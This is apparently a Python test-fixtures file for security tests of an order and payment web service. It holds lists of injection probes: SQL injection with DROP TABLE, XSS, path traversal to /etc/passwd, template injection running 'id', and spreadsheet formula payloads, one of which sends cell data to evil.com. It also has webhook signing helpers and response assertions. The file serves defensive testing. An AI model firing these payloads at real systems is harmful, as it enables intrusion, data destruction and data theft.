"""
Shared test fixtures and helpers for attack simulation tests.

Provides:
  - Fake user/token builders (no DB required)
  - Fake request payloads
  - Common injection probe strings
  - HMAC signing helpers for webhook tests
"""
from __future__ import annotations

import hashlib
import hmac
import json
import time
import uuid
from typing import Any


# ââ Injection probe payloads âââââââââââââââââââââââââââââââââââââââââââââââââ

SQL_INJECTION_PROBES = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1--",
    "1; SELECT pg_sleep(5); --",
    "\"); DROP TABLE products; --",
]

XSS_PROBES = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "';alert('xss')//",
    "<iframe src='javascript:alert(1)'></iframe>",
    "\"><script>document.cookie</script>",
]

PATH_TRAVERSAL_PROBES = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00.pdf",
]

TEMPLATE_INJECTION_PROBES = [
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "#{7*7}",
    "{{config}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
]

CSV_FORMULA_INJECTION_PROBES = [
    "=HYPERLINK(\"http://evil.com\"&A1,\"click\")",
    "=SUM(1+1)*cmd|' /C calc'!A0",
    "+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
]

OVERSIZED_STRINGS = {
    "10kb": "a" * 10_001,
    "1mb": "a" * 1_024 * 1_024,
    "unicode_bomb": ("N" * 500),
}


# ââ Payload builders âââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

def fake_token(user_id: str | None = None) -> str:
    """Build a fake (invalid) JWT-like token for negative tests."""
    return f"Bearer fake.token.{user_id or uuid.uuid4()}"


def user_create_payload(**overrides) -> dict:
    base = {
        "username": f"testuser_{uuid.uuid4().hex[:8]}",
        "email": f"test_{uuid.uuid4().hex[:8]}@example.com",
        "full_name": "Test User",
        "password": "ValidPass1",
        "is_active": True,
        "is_superuser": False,
    }
    return {**base, **overrides}


def sales_order_payload(**overrides) -> dict:
    base = {
        "customer_id": str(uuid.uuid4()),
        "lines": [
            {
                "product_id": str(uuid.uuid4()),
                "ordered_quantity": 10,
                "unit_price": 100.0,
            }
        ],
    }
    return {**base, **overrides}


def webhook_payload(
    event_type: str = "stock.updated",
    data: dict | None = None,
) -> dict:
    return {
        "event": event_type,
        "timestamp": int(time.time()),
        "idempotency_key": str(uuid.uuid4()),
        "data": data or {"test": True},
    }


# ââ Webhook signing helpers âââââââââââââââââââââââââââââââââââââââââââââââââââ

def sign_webhook(payload: dict, secret: str) -> str:
    """Compute HMAC-SHA256 signature for a webhook payload."""
    body = json.dumps(payload, separators=(",", ":")).encode()
    return hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()


def sign_webhook_with_timestamp(payload: dict, secret: str, timestamp: int) -> str:
    """Sign payload with timestamp prefix (like Stripe webhook signing)."""
    body = json.dumps(payload, separators=(",", ":")).encode()
    signed_body = f"{timestamp}.".encode() + body
    return hmac.new(secret.encode(), signed_body, hashlib.sha256).hexdigest()


# ââ Business abuse payload helpers ââââââââââââââââââââââââââââââââââââââââââ

def below_cost_pricing_payload(cost: float = 100.0, margin: float = -10.0) -> dict:
    """A pricing payload where selling price is below cost."""
    selling = cost * (1 + margin / 100)
    return {"unit_price": round(selling, 2), "cost_price": cost}


def duplicate_payment_payload(customer_id: str, amount: float = 5000.0) -> dict:
    return {
        "customer_id": customer_id,
        "amount": amount,
        "payment_method": "bank_transfer",
        "reference": "DUP-TEST",
    }


# ââ Response assertion helpers ââââââââââââââââââââââââââââââââââââââââââââââââ

def assert_no_stack_trace(response_body: dict) -> None:
    """Assert that error response does not contain stack trace or internal paths."""
    body_str = json.dumps(response_body).lower()
    dangerous_keys = ["traceback", "stacktrace", "stack_trace", "exception",
                      "at line", "file \"app/", "sqlalchemy", "psycopg", "asyncpg"]
    for key in dangerous_keys:
        assert key not in body_str, f"Response leaks internal detail: found '{key}'"


def assert_auth_required(status_code: int) -> None:
    """Assert response indicates authentication is required."""
    assert status_code in (401, 403), f"Expected 401/403, got {status_code}"


def assert_permission_denied(status_code: int) -> None:
    """Assert response indicates permission was denied."""
    assert status_code == 403, f"Expected 403, got {status_code}"


def assert_validation_error(status_code: int) -> None:
    """Assert response indicates input validation failure."""
    assert status_code in (400, 422), f"Expected 400/422, got {status_code}"
